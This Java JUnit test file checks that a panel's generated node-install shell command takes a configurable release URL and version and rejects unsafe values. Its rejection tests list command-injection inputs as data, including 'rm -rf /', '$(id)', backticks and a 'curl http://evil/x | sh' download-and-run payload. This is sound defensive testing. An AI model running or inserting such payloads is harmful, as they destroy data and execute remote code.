package com.admin.compat;

import com.admin.common.lang.R;
import com.admin.entity.Node;
import com.admin.entity.ViteConfig;
import com.admin.mapper.NodeMapper;
import com.admin.service.ViteConfigService;
import com.admin.service.impl.NodeServiceImpl;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.test.util.ReflectionTestUtils;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.when;

/**
 * 缺陷1：节点安装命令把上游地址硬编码
 * {@code curl -L https://github.com/bqlpfy/flux-panel/releases/download/2.0.7-beta/install.sh}。
 * 自建 fork 装节点会拉到上游二进制，版本不可控。
 *
 * <p>修复后：基址与版本都从「系统属性 &gt; 环境变量 &gt; 默认值」解析，
 * 默认值与原先硬编码逐字一致（行为不回退）；且只有通过白名单校验的值才允许拼进 shell 命令。</p>
 */
class NodeInstallCommandTest {

    private static final String PROP_BASE_URL = "flux.panel.release.baseUrl";
    private static final String PROP_VERSION = "flux.panel.release.version";
    private static final String UPSTREAM_BASE_URL = "https://github.com/bqlpfy/flux-panel/releases/download";
    private static final String DEFAULT_VERSION = "2.0.7-beta";
    private static final String SECRET = "0f4b8f8b7c2d4a1a9f0e5d6c7b8a9e0f";

    private NodeServiceImpl nodeService;

    @BeforeEach
    void setUp() {
        clearReleaseConfig();
        NodeMapper nodeMapper = mock(NodeMapper.class);
        ViteConfigService viteConfigService = mock(ViteConfigService.class);

        Node node = new Node();
        node.setId(9L);
        node.setSecret(SECRET);
        when(nodeMapper.selectById(9L)).thenReturn(node);

        when(viteConfigService.getOne(any())).thenReturn(viteConfig("1.2.3.4"));

        nodeService = new NodeServiceImpl();
        ReflectionTestUtils.setField(nodeService, "baseMapper", nodeMapper);
        ReflectionTestUtils.setField(nodeService, "viteConfigService", viteConfigService);
    }

    @AfterEach
    void tearDown() {
        clearReleaseConfig();
    }

    private static void clearReleaseConfig() {
        System.clearProperty(PROP_BASE_URL);
        System.clearProperty(PROP_VERSION);
    }

    private static ViteConfig viteConfig(String value) {
        ViteConfig config = new ViteConfig();
        config.setName("ip");
        config.setValue(value);
        return config;
    }

    private String installCommand() {
        R result = nodeService.getInstallCommand(9L);
        assertEquals(0, result.getCode(), "命令生成应成功：" + result.getMsg());
        assertNotNull(result.getData());
        return result.getData().toString();
    }

    @Test
    @DisplayName("未配置任何基址/版本 → 命令与原先硬编码逐字一致（行为不回退）")
    void defaultCommandKeepsUpstreamRelease() {
        String command = installCommand();

        assertEquals("curl -L " + UPSTREAM_BASE_URL + "/" + DEFAULT_VERSION + "/install.sh"
                        + " -o ./install.sh && chmod +x ./install.sh && "
                        + "./install.sh -a 1.2.3.4 -s " + SECRET,
                command);
    }

    @Test
    @DisplayName("注入自建基址（系统属性）→ 命令改用该基址，版本仍走默认值")
    void injectedBaseUrlReplacesUpstream() {
        String selfHosted = "http://192.0.2.10:8080/flux/releases/download";
        System.setProperty(PROP_BASE_URL, selfHosted);

        String command = installCommand();

        assertTrue(command.startsWith("curl -L " + selfHosted + "/" + DEFAULT_VERSION + "/install.sh "),
                "应使用注入的基址，实际：" + command);
        assertFalse(command.contains("github.com/bqlpfy"), "自建 fork 不能再拉上游二进制");
    }

    @Test
    @DisplayName("注入版本号（系统属性）→ 命令改用该版本")
    void injectedVersionReplacesDefault() {
        System.setProperty(PROP_VERSION, "2.0.7-beta-fork.3");

        String command = installCommand();

        assertTrue(command.startsWith("curl -L " + UPSTREAM_BASE_URL + "/2.0.7-beta-fork.3/install.sh "),
                "应使用注入的版本，实际：" + command);
    }

    @Test
    @DisplayName("基址尾部多个斜杠会被归一，不产生 //install.sh")
    void trailingSlashIsNormalized() {
        System.setProperty(PROP_BASE_URL, "http://192.0.2.10:8080/flux//");

        String command = installCommand();

        assertTrue(command.startsWith("curl -L http://192.0.2.10:8080/flux/" + DEFAULT_VERSION + "/install.sh "),
                "实际：" + command);
        assertFalse(command.contains("//" + DEFAULT_VERSION), "不应出现重复斜杠");
    }

    @Test
    @DisplayName("基址为空白 → 视为未配置，继续用默认值（不报错）")
    void blankBaseUrlFallsBackToDefault() {
        System.setProperty(PROP_BASE_URL, "   ");

        String command = installCommand();

        assertTrue(command.startsWith("curl -L " + UPSTREAM_BASE_URL + "/" + DEFAULT_VERSION + "/install.sh "),
                "实际：" + command);
    }

    @Test
    @DisplayName("非法基址被拒：非 http/https、含空格/引号/分号/管道/反引号/命令替换，一律不拼进 shell 命令")
    void illegalBaseUrlIsRejected() {
        String[] illegalBaseUrls = {
                "ftp://192.0.2.10/flux/releases/download",
                "file:///etc/passwd",
                "https://192.0.2.10/flux/releases/download ; rm -rf /",
                "https://192.0.2.10/flux/$(id)/download",
                "https://192.0.2.10/flux/`id`/download",
                "https://192.0.2.10/flux/a|b",
                "https://192.0.2.10/flux/a&b",
                "https://192.0.2.10/flux/a b",
                "https://192.0.2.10/flux/\"quoted\"",
                "https://192.0.2.10/flux/'single'",
                "javascript:alert(1)",
                "//192.0.2.10/flux",
        };

        for (String illegal : illegalBaseUrls) {
            System.setProperty(PROP_BASE_URL, illegal);

            R result = nodeService.getInstallCommand(9L);

            assertEquals(-1, result.getCode(), "非法基址必须被拒：" + illegal);
            assertNull(result.getData(), "被拒时不能返回任何命令：" + illegal);
            assertTrue(result.getMsg().contains("发布包基址不合法"), "文案应说明是基址问题：" + result.getMsg());
        }
    }

    @Test
    @DisplayName("非法版本号被拒：只允许 [A-Za-z0-9._-]，其余一律不拼进 shell 命令")
    void illegalVersionIsRejected() {
        String[] illegalVersions = {
                "2.0.7-beta; curl http://evil/x | sh",
                "2.0.7-beta && rm -rf /",
                "1.0 $(id)",
                "../../../etc/passwd",
                "2.0.7 beta",
                "v2\"0",
                "2.0.7`id`",
        };

        for (String illegal : illegalVersions) {
            System.setProperty(PROP_VERSION, illegal);

            R result = nodeService.getInstallCommand(9L);

            assertEquals(-1, result.getCode(), "非法版本号必须被拒：" + illegal);
            assertNull(result.getData(), "被拒时不能返回任何命令：" + illegal);
            assertTrue(result.getMsg().contains("发布包版本号不合法"), "文案应说明是版本问题：" + result.getMsg());
        }
    }

    @Test
    @DisplayName("节点不存在时仍然先报节点不存在（校验顺序不变）")
    void missingNodeStillReportsNodeMissing() {
        NodeMapper emptyMapper = mock(NodeMapper.class);
        ReflectionTestUtils.setField(nodeService, "baseMapper", emptyMapper);
        System.setProperty(PROP_BASE_URL, "ftp://bad");

        R result = nodeService.getInstallCommand(404L);

        assertEquals(-1, result.getCode());
        assertEquals("节点不存在", result.getMsg());
    }
}
